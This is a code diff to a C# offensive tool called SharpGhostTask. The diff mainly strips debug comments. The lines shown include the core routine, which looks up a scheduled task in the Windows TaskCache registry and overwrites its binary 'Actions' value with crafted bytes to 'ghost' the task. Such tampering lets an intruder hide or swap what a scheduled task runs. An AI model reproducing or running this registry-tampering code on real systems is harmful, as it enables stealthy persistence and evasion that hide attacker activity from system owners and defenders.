@@ -56,7 +56,6 @@ namespace SharpGhostTask
 
             void GhostTask(string Task, string targetB)
             {
-                //Console.WriteLine("No valid option provided.");
                 // Ghost Scheduled Tasks
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine(@"
@@ -68,22 +67,14 @@ namespace SharpGhostTask
 ");
                 string targetPath = $"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\{Task}";
 
-                //Console.WriteLine("Searching here " + targetPath);
-
                 Console.WriteLine($"Ghosting Task {Task}");
 
                 string idValue = GetIdValue(targetPath);
-
-                //Console.WriteLine(idValue);
 
                 // Start Ghosting
 
                 // Specify the registry path
                 string registryKeyPath = $"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{idValue}";
-
-                //Console.WriteLine(registryKeyPath);
-
-                //DisplayKeyValues(registryKeyPath);
 
                 // Specify the name of the registry entry
                 string valueName = "Actions";
@@ -100,7 +91,7 @@ namespace SharpGhostTask
                 // Filler Decimal Values
                 byte[] magicBytes1 = { 3, 0, 12, 0, 0, 0, 65, 0, 117, 0, 116, 0, 104, 0, 111, 0, 114, 0, 102, 102, 0, 0, 0, 0, 0, 0, 0, 0 };
 
-                // Find and replace the value "REPLACEME" with a new value
+                // Find and replace the value of the 24 decimal location with a new value
                 byte[] characterCountBytes = BitConverter.GetBytes(characterCount);
                 Array.Copy(characterCountBytes, 0, magicBytes1, 24, characterCountBytes.Length);
 
@@ -118,28 +109,15 @@ namespace SharpGhostTask
                 for (int i = 0; i <= totalSteps; i++)
                 {
                     UpdateProgressBar(i, totalSteps);
-                    // Simulate some work (replace this with your actual work)
+                    // Fake progress for niceness
                     Thread.Sleep(500);
                 }
                 Console.WriteLine("");
                 // Create the registry entry with REG_BINARY value
                 SetRegistryValue(registryKeyPath, valueName, combinedBinaryData);
-
-                //Registry.SetValue(registryKeyPath, valueName, combinedBinaryData, RegistryValueKind.Binary);
                 Console.WriteLine("Ghosted!!!");
 
                 Console.ForegroundColor = ConsoleColor.Gray;
-
-                /*
-                if (idValue != null)
-                {
-                    Console.WriteLine($"Id: {idValue}");
-                }
-                else
-                {
-                    Console.WriteLine("Id not found.");
-                }
-                */
             }
 
             void UpdateProgressBar(int currentStep, int totalSteps)
@@ -197,38 +175,6 @@ namespace SharpGhostTask
                     return null;
                 }
             }
-            /*
-            void DisplayKeyValues(string registryPath)
-            {
-                RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath);
-
-                if (key != null)
-                {
-                    foreach (var valueName in key.GetValueNames())
-                    {
-                        // Output each value within the key
-                        Console.WriteLine($"{registryPath}\\{valueName}: {FormatValue(key.GetValue(valueName))}");
-                    }
-                }
-                else
-                {
-                    Console.WriteLine($"Registry path '{registryPath}' not found.");
-                }
-            }               
-
-            string FormatValue(object value)
-            {
-                if (value is byte[] byteArray)
-                {
-                    // Convert byte array to a readable string (e.g., hexadecimal representation)
-                    return BitConverter.ToString(byteArray).Replace("-", " ");
-                }
-                else
-                {
-                    return value.ToString();
-                }
-            }
-            */
 
             //Find Tasks
             void ShowTasks()
